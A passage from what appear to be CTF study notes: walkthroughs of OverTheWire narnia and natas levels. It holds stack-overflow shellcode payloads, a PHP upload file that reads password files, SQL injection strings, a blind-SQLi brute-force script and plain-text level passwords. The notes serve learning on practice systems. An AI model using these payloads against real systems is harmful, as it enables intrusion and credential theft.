\u00a0 \u00a0 2\u00a0 \u00a0 \u00a0 63\n</code></pre> Create a pattern to locate the injection point. <pre><code>gef\u27a4  pattern create\n[+] Generating a pattern of 1024 bytes (n=4)\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak\nProgram received signal SIGSEGV, Segmentation fault.\n0x62616169 in ?? ()\ngef\u27a4  pattern search 0x62616169\n[+] Searching for '69616162'/'62616169' with period=4\n[+] Found at offset 132 (little-endian search) likely\n</code></pre></p>"},{"location":"CTFs/over-the-wire/narnia/narnia2/#failed-payload","title":"Failed Payload","text":"<p>Failed Payload : <pre><code>`{ shellcraft -f r cat /etc/narnia_pass/narnia3 ; printf 'a%0.s' {1..69}; python3 -c 'print(\"\\x98\\xd0\\xff\\xff\")' ;}`\n</code></pre> python3 would print <code>\\x98</code> as a unicode identifier. Therefore, the output would not be the raw hexidecimal string, as one thought.</p> <p>Failed Payload 2: <pre><code>`{ shellcraft -f r cat /etc/narnia_pass/narnia3 ; printf 'a%0.s' {1..69}; printf '\\x98\\xd0\\xff\\xff' ;}`\n</code></pre> Failed Payload 3: <pre><code>`{ printf '\\x90%0.s' {1..65}; shellcraft -f r cat /etc/narnia_pass/narnia3 ; printf '\\x90%0.s' {1..4}; printf '\\x38\\xd4\\xff\\xff' ;}`\n</code></pre> Reason: The shellcode includes several push commands. After those commands were executed, the shellcode were overwritten. In other words, esp pointed to the shellcode.</p>"},{"location":"CTFs/over-the-wire/narnia/narnia2/#success","title":"Success","text":"<p>Success payload: <pre><code>$(printf '\\x90%0.s' {1..100}; printf '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80'; printf '\\x90%0.s' {1..4}; printf '\\x38\\xd4\\xff\\xff')\n</code></pre> However,  <pre><code>narnia2@gibson:~$ /narnia/narnia2 $(printf '\\x90%0.s' {1..50}; printf '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80'; printf '\\x90%0.s' {1..54}; printf '\\x38\\xd4\\xff\\xff')\n$ whoami\nnarnia2\n</code></pre> reason: many operating systems ignore the setuid attribute when applied to executable shell scripts.</p> <p>Payload generator: <pre><code>from pwn import *\n\ndef asm2bytes(asm_str : str):\n    return asm(asm_str)\n\ndef make_payload(raw_cmd):\n    total_padding_num = 132\n    back_padding_num = 50\n    front_padding_num = total_padding_num - back_padding_num - len(raw_cmd)\n    return front_padding_num * b\"\\x90\" + raw_cmd + back_padding_num * b\"\\x90\" + b\"\\x08\\xd4\\xff\\xff\"\n\ndef main():\n    file_name = \"/etc/narnia_pass/narnia3\"\n    cat = shellcraft.i386.linux.cat(file_name)\n    raw_cat = asm2bytes(cat)\n    # \"hiii\" is fine\n    # \"hiiia\" failed\n    echos = shellcraft.i386.linux.echo(\"hiiiabcd\") \n    raw_echos = asm2bytes(echos)\n    payload = make_payload(raw_echos)\n    with open(\"raw\", \"wb\") as f:\n        f.write(payload)\n\nmain()\n</code></pre> Script: <pre><code>#/usr/bin/bash\npython3 test.py\n/narnia/narnia2 `cat raw`\n8SyQ2wyEDU\n</code></pre></p>"},{"location":"CTFs/over-the-wire/narnia/narnia2/#solving","title":"Solving","text":""},{"location":"CTFs/over-the-wire/narnia/narnia2/#techniques","title":"Techniques","text":"<ul> <li>[[shellcode]]</li> </ul>"},{"location":"CTFs/over-the-wire/narnia/narnia2/#tools","title":"Tools","text":"<ul> <li>[[gef]]</li> <li>[[checksec]]</li> <li>ltrace</li> </ul>"},{"location":"CTFs/over-the-wire/narnia/narnia3/","title":"narnia 3 walkthrough","text":""},{"location":"CTFs/over-the-wire/narnia/narnia3/#description","title":"Description","text":"<p>connect <pre><code>$ ssh narnia3@narnia.labs.overthewire.org -p 2226\n8SyQ2wyEDU\n</code></pre> execute <pre><code>$ /narnia/narnia3\nusage, /narnia/narnia3 file, will send contents of file 2 /dev/null\n$ /narnia/narnia3 /etc/narnia_pass/narnia4\ncopied contents of /etc/narnia_pass/narnia4 to a safer place... (/dev/null)\n</code></pre></p>"},{"location":"CTFs/over-the-wire/narnia/narnia3/#hint","title":"Hint","text":"<ul> <li>https://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html</li> <li>https://0x10f8.wordpress.com/2019/05/21/subverting-nx-bit-with-return-to-libc/</li> <li>https://blog.devaviary.com/posts/narnia-guide/levels-0-to-4.html</li> </ul>"},{"location":"CTFs/over-the-wire/narnia/narnia3/#progress","title":"Progress","text":"<p><pre><code>$ checksec --file /narnia/narnia3\n[*] '/narnia/narnia3'\n    Arch:     i386-32-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n</code></pre> Tried to use [[buffer overflow]]. Use pattern create in gef <pre><code>$ ltrace /narnia/narnia3 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak\nstrcpy(0xffffd100, \"aaaabaaacaaadaaaeaaafaaagaaahaaa\"...)\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 = 0xffffd100\nopen(\"iaaajaaakaaalaaamaaanaaaoaaapaaa\"..., 2, 00) \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 = -1\n</code></pre> The value of <code>ofile</code> was changed from  <code>/dev/null</code> to part of payload. In addition, the <code>ofile</code> started from the 33rd character.</p>"},{"location":"CTFs/over-the-wire/narnia/narnia3/#strategy-1","title":"Strategy 1","text":"<p>The remaining steps might be 1. Let <code>ofile</code> keeps its own value 2. Construct a shellcode and properly put it into the payload 3. Overwrite the return address to execute the shellcode.</p>"},{"location":"CTFs/over-the-wire/narnia/narnia3/#step-1","title":"Step 1","text":"<p>Failed <pre><code>$ ltrace /narnia/narnia3 `{ printf \"A%0.s\" {1..32}; printf \"/dev/null/\"; printf \"\\0%0.s\" {1..7}; printf \"A\"; }`\n-bash: warning: command substitution: ignored null byte in input\n__libc_start_main(0x80491d6, 2, 0xffffd5c4, 0 &lt;unfinished ...&gt;\nstrcpy(0xffffd4d0, \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"...)          = 0xffffd4d0\nopen(\"/dev/null/A\", 2, 00)                                         = -1\n</code></pre></p>"},{"location":"CTFs/over-the-wire/narnia/narnia3/#strategy-2-failed","title":"Strategy 2 (Failed)","text":"<ol> <li>construct an input file with a special name and path</li> <li>use buffer overflow to overwrite ofile as /etc/narnia_pass/narnia4</li> <li>ssh to narnia4</li> </ol>"},{"location":"CTFs/over-the-wire/narnia/narnia3/#step-1_1","title":"Step 1","text":"<p><pre><code>narnia3@gibson:/tmp/tmp.xx2QlC2PYn$ echo aaaabaaacaaadaaaeaaafaaagaaahaaa | wc\n      1       1      33\nnarnia3@gibson:/tmp/tmp.xx2QlC2PYn$ echo /tmp/tmp.xx2QlC2PYn | wc\n      1       1      20\n</code></pre> 33-20 = 13.  Therefore, we need to construct a folder with length of 12 characters. <pre><code>narnia3@gibson:/tmp/tmp.xx2QlC2PYn/aaaaaaaaaaaa/etc/narnia_pass$ echo 1234 &gt; narnia4\nnarnia3@gibson:/tmp/tmp.xx2QlC2PYn/aaaaaaaaaaaa/etc/narnia_pass$ /narnia/narnia3 /tmp/tmp.xx2QlC2PYn/aaaaaaaaaaaa/etc/narnia_pass/narnia4 \nerror opening /etc/narnia_pass/nar????\n</code></pre></p>"},{"location":"CTFs/over-the-wire/narnia/narnia3/#step-15","title":"Step 1.5","text":"<p><pre><code>/etc/narnia_pass$ ls -l narnia4 \n-r-------- 1 narnia4 narnia4 11 Oct  5 06:20 narnia4\n</code></pre> It is read-only. This strategy failed.</p>"},{"location":"CTFs/over-the-wire/narnia/narnia3/#strategy-3","title":"Strategy 3","text":"<p>Similar to strategy 2 1. make <code>argv[1]</code> to <code>/etc/narnia_pass/narnia4</code> 2. use buffer overflow to overwrite the output file name</p>"},{"location":"CTFs/over-the-wire/narnia/narnia3/#step-1_2","title":"Step 1","text":"<p>A long prefix should be added to <code>/etc/narnia_pass/narnia4</code>. Use relative path! With a little script, input can be determined. <pre><code>i=2\n././../../etc/narnia_pass/narnia4\n4\ni=3\n./././../../etc/narnia_pass/narnia4\nia4\ni=4\n././././../../etc/narnia_pass/narnia4\nrnia4\n</code></pre></p>"},{"location":"CTFs/over-the-wire/narnia/narnia3/#step-2","title":"Step 2","text":"<pre><code>/tmp/tmp.6NeI6Ehb05$ /narnia/narnia3 ./././../../etc/narnia_pass/narnia4\nerror opening ia4\n</code></pre>"},{"location":"CTFs/over-the-wire/narnia/narnia3/#solving","title":"Solving","text":""},{"location":"CTFs/over-the-wire/narnia/narnia3/#techniques","title":"Techniques","text":""},{"location":"CTFs/over-the-wire/narnia/narnia3/#tools","title":"Tools","text":""},{"location":"CTFs/over-the-wire/natas/natas11/","title":"natas 11 walkthrough","text":""},{"location":"CTFs/over-the-wire/natas/natas11/#description","title":"Description","text":"<p>Username: natas11</p> <p>URL:      http://natas11.natas.labs.overthewire.org</p>"},{"location":"CTFs/over-the-wire/natas/natas11/#source-code","title":"Source Code","text":"<pre><code>&lt;?\n\n$defaultdata = array( \"showpassword\"=&gt;\"no\", \"bgcolor\"=&gt;\"#ffffff\");\n\nfunction xor_encrypt($in) {\n    $key = '&lt;censored&gt;';\n    $text = $in;\n    $outText = '';\n\n    // Iterate through each character\n    for($i=0;$i&lt;strlen($text);$i++) {\n    $outText .= $text[$i] ^ $key[$i % strlen($key)];\n    }\n\n    return $outText;\n}\n\nfunction loadData($def) {\n    global $_COOKIE;\n    $mydata = $def;\n    if(array_key_exists(\"data\", $_COOKIE)) {\n    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[\"data\"])), true);\n    if(is_array($tempdata) &amp;&amp; array_key_exists(\"showpassword\", $tempdata) &amp;&amp; array_key_exists(\"bgcolor\", $tempdata)) {\n        if (preg_match('/^#(?:[a-f\\d]{6})$/i', $tempdata['bgcolor'])) {\n        $mydata['showpassword'] = $tempdata['showpassword'];\n        $mydata['bgcolor'] = $tempdata['bgcolor'];\n        }\n    }\n    }\n    return $mydata;\n}\n\nfunction saveData($d) {\n    setcookie(\"data\", base64_encode(xor_encrypt(json_encode($d))));\n}\n\n$data = loadData($defaultdata);\n\nif(array_key_exists(\"bgcolor\",$_REQUEST)) {\n    if (preg_match('/^#(?:[a-f\\d]{6})$/i', $_REQUEST['bgcolor'])) {\n        $data['bgcolor'] = $_REQUEST['bgcolor'];\n    }\n}\n\nsaveData($data);\n\n\n\n?&gt;\n\n&lt;h1&gt;natas11&lt;/h1&gt;\n&lt;div id=\"content\"&gt;\n&lt;body style=\"background: &lt;?=$data['bgcolor']?&gt;;\"&gt;\nCookies are protected with XOR encryption&lt;br/&gt;&lt;br/&gt;\n\n&lt;?\nif($data[\"showpassword\"] == \"yes\") {\n    print \"The password for natas12 is &lt;censored&gt;&lt;br&gt;\";\n}\n\n?&gt;\n</code></pre>"},{"location":"CTFs/over-the-wire/natas/natas11/#cookie","title":"Cookie","text":"<p>Name : data  Value : HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg= Domain : natas11.natas.labs.overthewire.org</p>"},{"location":"CTFs/over-the-wire/natas/natas11/#progress","title":"Progress","text":""},{"location":"CTFs/over-the-wire/natas/natas11/#observation","title":"Observation","text":"<p>default data --(json encode, <code>xor_encrypt</code>, base64 encode)--&gt; cookie</p> <p>Therefore, we know that <code>json_encoded(data) xor key = base64_decode(cookie)</code>. From the property of xor $a \\oplus b = c \\leftrightarrow a \\oplus c = b$, we can get the key by  <code>key = json_encoded(data) xor base64_decode(cookie)</code>.</p>"},{"location":"CTFs/over-the-wire/natas/natas11/#get-the-key","title":"Get the Key","text":"<p>Use the following code to get the key. <pre><code>$defaultdata = array( \"showpassword\"=&gt;\"no\", \"bgcolor\"=&gt;\"#ffffff\");\n$natasCookie = \"HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=\";\nfunction xors($a, $b) {\n    $key = $a;\n    $text = $b;\n    $outText = '';\n\n    // Iterate through each character\n    for($i=0;$i&lt;strlen($text);$i++) {\n    $outText .= $text[$i] ^ $key[$i % strlen($key)];\n    }\n\n    return $outText;\n}\n$natasKey = xors(base64_decode($natasCookie),json_encode($defaultdata));\necho $natasKey;\n</code></pre> Key = eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe</p>"},{"location":"CTFs/over-the-wire/natas/natas11/#make-payload","title":"Make Payload","text":"<p>The payload should contain two keys, <code>showpassword</code> and <code>bgcolor</code>. <pre><code>$payload = array( \"showpassword\"=&gt;\"yes\", \"bgcolor\"=&gt;\"#fffaaf\");\n$myCookie = base64_encode(xor_encrypt(json_encode($payload)));\necho \"my cookie payload : \";\necho $myCookie;\necho \"\\n\";\n</code></pre></p>"},{"location":"CTFs/over-the-wire/natas/natas11/#get-the-password","title":"Get the Password","text":"<p>When using key = eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe, it failed. Guess the key should be <code>eDWo</code>. Then, it works.</p>"},{"location":"CTFs/over-the-wire/natas/natas11/#hint","title":"Hint","text":""},{"location":"CTFs/over-the-wire/natas/natas11/#solving","title":"Solving","text":""},{"location":"CTFs/over-the-wire/natas/natas11/#techniques","title":"Techniques","text":"<ul> <li>[[xor]]</li> </ul>"},{"location":"CTFs/over-the-wire/natas/natas11/#tools","title":"Tools","text":""},{"location":"CTFs/over-the-wire/natas/natas12/","title":"natas 12 walkthrough","text":""},{"location":"CTFs/over-the-wire/natas/natas12/#description","title":"Description","text":"<p>Username: natas12</p> <p>URL:      http://natas12.natas.labs.overthewire.org</p>"},{"location":"CTFs/over-the-wire/natas/natas12/#source-code","title":"Source Code","text":"<pre><code>&lt;?php\n\nfunction genRandomString() {\n    $length = 10;\n    $characters = \"0123456789abcdefghijklmnopqrstuvwxyz\";\n    $string = \"\";\n\n    for ($p = 0; $p &lt; $length; $p++) {\n        $string .= $characters[mt_rand(0, strlen($characters)-1)];\n    }\n\n    return $string;\n}\n\nfunction makeRandomPath($dir, $ext) {\n    do {\n    $path = $dir.\"/\".genRandomString().\".\".$ext;\n    } while(file_exists($path));\n    return $path;\n}\n\nfunction makeRandomPathFromFilename($dir, $fn) {\n    $ext = pathinfo($fn, PATHINFO_EXTENSION);\n    return makeRandomPath($dir, $ext);\n}\n\nif(array_key_exists(\"filename\", $_POST)) {\n    $target_path = makeRandomPathFromFilename(\"upload\", $_POST[\"filename\"]);\n\n\n        if(filesize($_FILES['uploadedfile']['tmp_name']) &gt; 1000) {\n        echo \"File is too big\";\n    } else {\n        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {\n            echo \"The file &lt;a href=\\\"$target_path\\\"&gt;$target_path&lt;/a&gt; has been uploaded\";\n        } else{\n            echo \"There was an error uploading the file, please try again!\";\n        }\n    }\n} else {\n?&gt;\n</code></pre>"},{"location":"CTFs/over-the-wire/natas/natas12/#progress","title":"Progress","text":""},{"location":"CTFs/over-the-wire/natas/natas12/#observation","title":"Observation","text":"<p>From the source code, we know it keeps the file extension, and it generates a random filename to replace the original one. </p> <p>First, notice that we can control the file name sent to the server side. By changing <code>&lt;input type=\"hidden\" name=\"filename\" value=\"utgmtlqgnh.jpg\"&gt;</code>, we can control the file extension. (seems useless)</p>"},{"location":"CTFs/over-the-wire/natas/natas12/#trial","title":"Trial","text":"<p>Use <code>.sh</code> file type : cannot execute Use <code>.php</code> file type : CAN execute</p>"},{"location":"CTFs/over-the-wire/natas/natas12/#make-php-file","title":"Make PHP file","text":"<p>Just open the file with password  <pre><code>&lt;?php \n$filepath = \"/etc/natas_webpass/natas13\";\n$myfile = fopen($filepath, \"r\") or die(\"Unable to open file!\");\necho fread($myfile,filesize($filepath));\nfclose($myfile);\n?&gt;\n</code></pre></p>"},{"location":"CTFs/over-the-wire/natas/natas12/#upload-and-access-the-file","title":"Upload and Access the File","text":""},{"location":"CTFs/over-the-wire/natas/natas12/#get-the-password","title":"Get the password.","text":""},{"location":"CTFs/over-the-wire/natas/natas12/#hint","title":"Hint","text":""},{"location":"CTFs/over-the-wire/natas/natas12/#solving","title":"Solving","text":""},{"location":"CTFs/over-the-wire/natas/natas12/#reference","title":"Reference","text":"<ul> <li>https://portswigger.net/web-security/file-upload</li> </ul>"},{"location":"CTFs/over-the-wire/natas/natas12/#category","title":"Category","text":"<ul> <li>[[File upload vulnerability]]</li> </ul>"},{"location":"CTFs/over-the-wire/natas/natas12/#techniques","title":"Techniques","text":""},{"location":"CTFs/over-the-wire/natas/natas12/#tools","title":"Tools","text":""},{"location":"CTFs/over-the-wire/natas/natas13/","title":"natas 13 walkthrough","text":""},{"location":"CTFs/over-the-wire/natas/natas13/#description","title":"Description","text":"<p>Username: natas13</p> <p>URL:      http://natas13.natas.labs.overthewire.org</p>"},{"location":"CTFs/over-the-wire/natas/natas13/#source-code","title":"Source Code","text":"<pre><code>&lt;?php\n\nfunction genRandomString() {\n    $length = 10;\n    $characters = \"0123456789abcdefghijklmnopqrstuvwxyz\";\n    $string = \"\";\n\n    for ($p = 0; $p &lt; $length; $p++) {\n        $string .= $characters[mt_rand(0, strlen($characters)-1)];\n    }\n\n    return $string;\n}\n\nfunction makeRandomPath($dir, $ext) {\n    do {\n    $path = $dir.\"/\".genRandomString().\".\".$ext;\n    } while(file_exists($path));\n    return $path;\n}\n\nfunction makeRandomPathFromFilename($dir, $fn) {\n    $ext = pathinfo($fn, PATHINFO_EXTENSION);\n    return makeRandomPath($dir, $ext);\n}\n\nif(array_key_exists(\"filename\", $_POST)) {\n    $target_path = makeRandomPathFromFilename(\"upload\", $_POST[\"filename\"]);\n\n    $err=$_FILES['uploadedfile']['error'];\n    if($err){\n        if($err === 2){\n            echo \"The uploaded file exceeds MAX_FILE_SIZE\";\n        } else{\n            echo \"Something went wrong :/\";\n        }\n    } else if(filesize($_FILES['uploadedfile']['tmp_name']) &gt; 1000) {\n        echo \"File is too big\";\n    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {\n        echo \"File is not an image\";\n    } else {\n        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {\n            echo \"The file &lt;a href=\\\"$target_path\\\"&gt;$target_path&lt;/a&gt; has been uploaded\";\n        } else{\n            echo \"There was an error uploading the file, please try again!\";\n        }\n    }\n} else {\n?&gt;\n</code></pre>"},{"location":"CTFs/over-the-wire/natas/natas13/#progress","title":"Progress","text":""},{"location":"CTFs/over-the-wire/natas/natas13/#observation","title":"Observation","text":"<p>Apparently, we should bypass <code>exif_imagetype</code>. </p>"},{"location":"CTFs/over-the-wire/natas/natas13/#trial","title":"Trial","text":"<p>Changing the file extension did not work. Try to use fake [[File signatures]]. <pre><code>printf \"\\x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a\\x0a\" &gt; test.png\n</code></pre> Successfully bypass the check.</p>"},{"location":"CTFs/over-the-wire/natas/natas13/#payload","title":"Payload","text":"<p>Directly append the php code to png file signature. <pre><code>printf \"\\x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a\\x0a\" &gt; test.png\ncat pwn.php &gt;&gt; test.png\n</code></pre> where <code>pwn.php</code> <pre><code>&lt;?php \n$filepath = \"/etc/natas_webpass/natas14\";\n$myfile = fopen($filepath, \"r\") or die(\"Unable to open file!\");\necho fread($myfile,filesize($filepath));\nfclose($myfile);\n?&gt;\n</code></pre> Failed. Server side did not execute the code.</p>"},{"location":"CTFs/over-the-wire/natas/natas13/#final","title":"Final","text":"<p>The payload is fine. However, the file extension should be changed to php to execute the code. <code>&lt;input type=\"hidden\" name=\"filename\" value=\"yi78i3gdm1.php\"&gt;</code> \ufffdPNG \u001a ** </p>"},{"location":"CTFs/over-the-wire/natas/natas13/#hint","title":"Hint","text":""},{"location":"CTFs/over-the-wire/natas/natas13/#solving","title":"Solving","text":""},{"location":"CTFs/over-the-wire/natas/natas13/#category","title":"Category","text":"<ul> <li>[[File upload vulnerability]]</li> </ul>"},{"location":"CTFs/over-the-wire/natas/natas13/#techniques","title":"Techniques","text":"<ul> <li>[[File signatures]]</li> </ul>"},{"location":"CTFs/over-the-wire/natas/natas13/#tools","title":"Tools","text":""},{"location":"CTFs/over-the-wire/natas/natas14/","title":"natas 14 walkthrough","text":""},{"location":"CTFs/over-the-wire/natas/natas14/#description","title":"Description","text":"<p>Username: natas14</p> <pre><code>URL:      http://natas14.natas.labs.overthewire.org\n</code></pre>"},{"location":"CTFs/over-the-wire/natas/natas14/#source-code","title":"Source Code","text":"<pre><code>&lt;?php\nif(array_key_exists(\"username\", $_REQUEST)) {\n    $link = mysqli_connect('localhost', 'natas14', '&lt;censored&gt;');\n    mysqli_select_db($link, 'natas14');\n\n    $query = \"SELECT * from users where username=\\\"\".$_REQUEST[\"username\"].\"\\\" and password=\\\"\".$_REQUEST[\"password\"].\"\\\"\";\n    if(array_key_exists(\"debug\", $_GET)) {\n        echo \"Executing query: $query&lt;br&gt;\";\n    }\n\n    if(mysqli_num_rows(mysqli_query($link, $query)) &gt; 0) {\n            echo \"Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;\";\n    } else {\n            echo \"Access denied!&lt;br&gt;\";\n    }\n    mysqli_close($link);\n} else {\n}\n?&gt;\n</code></pre>"},{"location":"CTFs/over-the-wire/natas/natas14/#progress","title":"Progress","text":""},{"location":"CTFs/over-the-wire/natas/natas14/#observation","title":"Observation","text":"<p>Server is using sql query. Definitely need to use [[sql injection MOC]].</p>"},{"location":"CTFs/over-the-wire/natas/natas14/#trial","title":"Trial","text":""},{"location":"CTFs/over-the-wire/natas/natas14/#case-1","title":"Case 1","text":"<p>Username : <code>3\" or 1=1 --</code> Password : <code>k</code></p> <p>Failed with error message : Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, bool given in\u00a0/var/www/natas/natas14/index.php\u00a0on line\u00a024</p>"},{"location":"CTFs/over-the-wire/natas/natas14/#case-2","title":"Case 2","text":"<p>Username : <code>3\" or 1=1 #</code> Password : <code>k</code> Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx</p>"},{"location":"CTFs/over-the-wire/natas/natas14/#case-3","title":"Case 3","text":"<p>Username : <code>3\" or 1=1 --</code> Password : <code>k</code> Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx</p>"},{"location":"CTFs/over-the-wire/natas/natas14/#hint","title":"Hint","text":""},{"location":"CTFs/over-the-wire/natas/natas14/#solving","title":"Solving","text":""},{"location":"CTFs/over-the-wire/natas/natas14/#category","title":"Category","text":"<ul> <li>[[sql injection MOC]]</li> </ul>"},{"location":"CTFs/over-the-wire/natas/natas14/#techniques","title":"Techniques","text":""},{"location":"CTFs/over-the-wire/natas/natas14/#tools","title":"Tools","text":""},{"location":"CTFs/over-the-wire/natas/natas15/","title":"natas 15 walkthrough","text":""},{"location":"CTFs/over-the-wire/natas/natas15/#description","title":"Description","text":"<p>Username: natas15</p> <p>URL:      http://natas15.natas.labs.overthewire.org</p>"},{"location":"CTFs/over-the-wire/natas/natas15/#source-code","title":"Source Code","text":"<pre><code>&lt;?php\n\n/*\nCREATE TABLE `users` (\n  `username` varchar(64) DEFAULT NULL,\n  `password` varchar(64) DEFAULT NULL\n);\n*/\n\nif(array_key_exists(\"username\", $_REQUEST)) {\n    $link = mysqli_connect('localhost', 'natas15', '&lt;censored&gt;');\n    mysqli_select_db($link, 'natas15');\n\n    $query = \"SELECT * from users where username=\\\"\".$_REQUEST[\"username\"].\"\\\"\";\n    if(array_key_exists(\"debug\", $_GET)) {\n        echo \"Executing query: $query&lt;br&gt;\";\n    }\n\n    $res = mysqli_query($link, $query);\n    if($res) {\n    if(mysqli_num_rows($res) &gt; 0) {\n        echo \"This user exists.&lt;br&gt;\";\n    } else {\n        echo \"This user doesn't exist.&lt;br&gt;\";\n    }\n    } else {\n        echo \"Error in query.&lt;br&gt;\";\n    }\n\n    mysqli_close($link);\n} else {\n?&gt;\n</code></pre>"},{"location":"CTFs/over-the-wire/natas/natas15/#progress","title":"Progress","text":""},{"location":"CTFs/over-the-wire/natas/natas15/#observation","title":"Observation","text":"<p>It is an easy [[sql injection MOC]], but that seems useless. Username : <code>natas16</code> -&gt; This user exists. The goal is retrieving the password of natas16. We cannot make the server print the password. The only thing we can do is check if the query returns anything. Therefore, we can input the password and check if the password is correct.</p>"},{"location":"CTFs/over-the-wire/natas/natas15/#payload","title":"Payload","text":"<p>Check password <code>natas16\" and password = \"pw\" --</code> Find password</p>"},{"location":"CTFs/over-the-wire/natas/natas15/#search-by-exhaust","title":"Search by Exhaust","text":"<p><pre><code>import requests\nfrom bs4 import BeautifulSoup\n\ndef request_with_password(password : str) -&gt; bool:\n    payload = f\"?username=natas16\\\" and password like binary \\\"{password}%\\\" -- \"\n    return request_with_payload(payload)\n\ndef request_with_payload(payload: str):\n    header = {\n        \"Authorization\" : \"Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg==\",\n    }\n    url = \"http://natas15.natas.labs.overthewire.org/index.php\"\n    url += payload\n    response = requests.get(url, headers=header)\n    soup = BeautifulSoup(response.text, 'html.parser')\n    content = soup.select('#content')\n    return \"exists\" in content.__str__()\n\ndef main():\n    success_password = \"\"\n    letters = 'abcdefghijklmnopqrstuvwxyz'\n    candidates = letters + letters.upper() + \"0123456789\"\n    while True:\n        for candidate in candidates:\n            if request_with_password(success_password + candidate):\n                success_password += candidate\n                print(success_password)\n                break\n        else:\n            print(f\"password : {success_password}\")\n            break\n\nmain()\n</code></pre> TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V</p>"},{"location":"CTFs/over-the-wire/natas/natas15/#hint","title":"Hint","text":""},{"location":"CTFs/over-the-wire/natas/natas15/#solving","title":"Solving","text":""},{"location":"CTFs/over-the-wire/natas/natas15/#category","title":"Category","text":"<ul> <li>[[sql injection MOC]]</li> </ul>"},{"location":"CTFs/over-the-wire/natas/natas15/#techniques","title":"Techniques","text":""},{"location":"CTFs/over-the-wire/natas/natas15/#tools","title":"Tools","text":""},{"location":"CTFs/over-the-wire/natas/natas16/","title":"natas 16 walkthrough","text":""},{"location":"CTFs/over-the-wire/natas/natas16/#description","title":"Description","text":"<p>Username: natas16</p> <p>URL:      http://natas16.natas.labs.overthewire.org</p>"},{"location":"CTFs/over-the-wire/natas/natas16/#source-code","title":"Source Code","text":"<pre><code>&lt;?\n$key = 